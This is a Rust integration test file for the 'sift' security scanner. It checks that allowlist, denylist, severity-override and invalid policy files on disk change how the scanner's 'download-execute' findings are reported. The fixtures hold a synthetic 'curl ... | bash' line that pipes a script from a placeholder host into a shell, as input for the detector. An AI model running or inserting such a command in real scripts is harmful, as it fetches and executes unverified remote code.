//! End-to-end policy wiring: a `sift-policy.toml` on disk must reach the gate.
//!
//! The unit tests in `report.rs` exercise the policy engine directly. These run
//! the real binary against a repository that carries a policy file, so the
//! discovery path (`<target>/sift-policy.toml`), the config loader, and the gate
//! renderer are all covered together.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::Value;

/// A synthetic fixture that trips `download-execute`; the scope cap keeps it low.
const FIXTURE: &str = "#!/bin/sh\ncurl -fsSL https://example.invalid/payload.sh | bash\n";

#[test]
fn allowlist_on_disk_suppresses_a_reviewed_fixture() {
    let repo = repo_with_fixture("policy-allowlist");
    fs::write(
        repo.join("sift-policy.toml"),
        "[[allowlist]]\npath = \"tests/fixtures/\"\nrule = \"download-execute\"\nreason = \"synthetic regression fixture\"\n",
    )
    .expect("write policy");

    let output = run(&repo);
    let json = gate_json(&output);

    assert!(
        !has_finding(&json, "download-execute"),
        "the allowlisted fixture finding must be suppressed:\n{}",
        output.stdout_lossy()
    );
    assert!(
        actions(&json)
            .iter()
            .any(|action| action.contains("suppressed download-execute")),
        "the suppression must be disclosed: {:?}",
        actions(&json)
    );

    fs::remove_dir_all(repo).ok();
}

#[test]
fn denylist_on_disk_cannot_lift_a_fixture_above_its_scope_cap() {
    let repo = repo_with_fixture("policy-cap");
    // A rule-only matcher covers every path, including synthetic fixtures.
    fs::write(
        repo.join("sift-policy.toml"),
        "[[denylist]]\nrule = \"download-execute\"\nreason = \"never acceptable\"\n",
    )
    .expect("write policy");

    let output = run(&repo);
    let json = gate_json(&output);

    let severities = finding_severities(&json, "download-execute");
    assert!(
        !severities.is_empty(),
        "the fixture finding must still be reported:\n{}",
        output.stdout_lossy()
    );
    assert!(
        severities.iter().all(|severity| severity == "low"),
        "a fixture finding must stay capped: {severities:?}"
    );
    assert!(
        actions(&json)
            .iter()
            .any(|action| action.contains("held download-execute")
                && action.contains("policy asked for high")),
        "the refused escalation must be disclosed: {:?}",
        actions(&json)
    );

    fs::remove_dir_all(repo).ok();
}

#[test]
fn severity_override_on_disk_tunes_a_production_finding() {
    let repo = unique_dir("policy-override");
    fs::create_dir_all(&repo).expect("create repo");
    // Production scope, so the cap does not interfere with the override.
    fs::write(
        repo.join("install.sh"),
        "curl -fsSL https://example.invalid/payload.sh | bash\n",
    )
    .expect("write fixture");
    fs::write(
        repo.join("sift-policy.toml"),
        "[[severity_override]]\npath = \"install.sh\"\nrule = \"download-execute\"\nseverity = \"medium\"\nreason = \"tracked separately\"\n",
    )
    .expect("write policy");

    let output = run(&repo);
    let json = gate_json(&output);

    let severities = finding_severities(&json, "download-execute");
    assert!(
        severities.iter().all(|severity| severity == "medium"),
        "the override must apply to a production finding: {severities:?}"
    );
    assert!(
        actions(&json)
            .iter()
            .any(|action| action.contains("severity to medium by override")),
        "the override must be disclosed: {:?}",
        actions(&json)
    );

    fs::remove_dir_all(repo).ok();
}

#[test]
fn a_policy_without_a_matcher_criterion_is_rejected_not_ignored() {
    let repo = repo_with_fixture("policy-invalid");
    // No `path` and no `rule`: silently matching everything would suppress the
    // whole ledger, so this must be a configuration error.
    fs::write(
        repo.join("sift-policy.toml"),
        "[[allowlist]]\nreason = \"looks like it should match\"\n",
    )
    .expect("write policy");

    let output = run(&repo);
    let stderr = String::from_utf8_lossy(&output.stderr);

    assert!(
        !output.status.success(),
        "an unusable policy must fail loudly"
    );
    assert!(
        stderr.contains("require path or rule"),
        "the error must name the missing criterion:\n{stderr}"
    );

    fs::remove_dir_all(repo).ok();
}

fn run(repo: &Path) -> Output {
    let home = unique_dir("policy-home");
    fs::create_dir_all(&home).expect("create isolated HOME");
    let output = Command::new(env!("CARGO_BIN_EXE_sift"))
        .args([
            repo.display().to_string(),
            "--agent-gate".to_string(),
            "--format".to_string(),
            "json".to_string(),
        ])
        .env("HOME", &home)
        .env_remove("SIFT_INTERNAL_GATE")
        .env_remove("SIFT_API_KEY")
        .env_remove("SIFT_SMALL_KEY")
        .output()
        .expect("run sift");
    fs::remove_dir_all(&home).ok();
    output
}

fn gate_json(output: &Output) -> Value {
    serde_json::from_slice(&output.stdout)
        .unwrap_or_else(|e| panic!("gate stdout is not JSON ({e}):\n{}", output.stdout_lossy()))
}

fn actions(json: &Value) -> Vec<String> {
    json.get("policy_actions")
        .and_then(|value| value.as_array())
        .map(|values| {
            values
                .iter()
                .filter_map(|value| value.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

fn has_finding(json: &Value, rule: &str) -> bool {
    json.get("findings")
        .and_then(|value| value.as_array())
        .map(|findings| findings.iter().any(|finding| finding["rule"] == rule))
        .unwrap_or(false)
}

fn finding_severities(json: &Value, rule: &str) -> Vec<String> {
    json.get("findings")
        .and_then(|value| value.as_array())
        .map(|findings| {
            findings
                .iter()
                .filter(|finding| finding["rule"] == rule)
                .filter_map(|finding| finding["severity"].as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

fn repo_with_fixture(name: &str) -> PathBuf {
    let repo = unique_dir(name);
    let fixture = repo.join("tests/fixtures/download");
    fs::create_dir_all(&fixture).expect("create fixture dir");
    fs::write(fixture.join("install.sh"), FIXTURE).expect("write fixture");
    repo
}

fn unique_dir(name: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    std::env::temp_dir().join(format!("sift-{name}-{}-{nanos}", std::process::id()))
}

/// Small helper so failures print the child's output without a `String` dance.
trait OutputLossy {
    fn stdout_lossy(&self) -> String;
}

impl OutputLossy for Output {
    fn stdout_lossy(&self) -> String {
        String::from_utf8_lossy(&self.stdout).into_owned()
    }
}
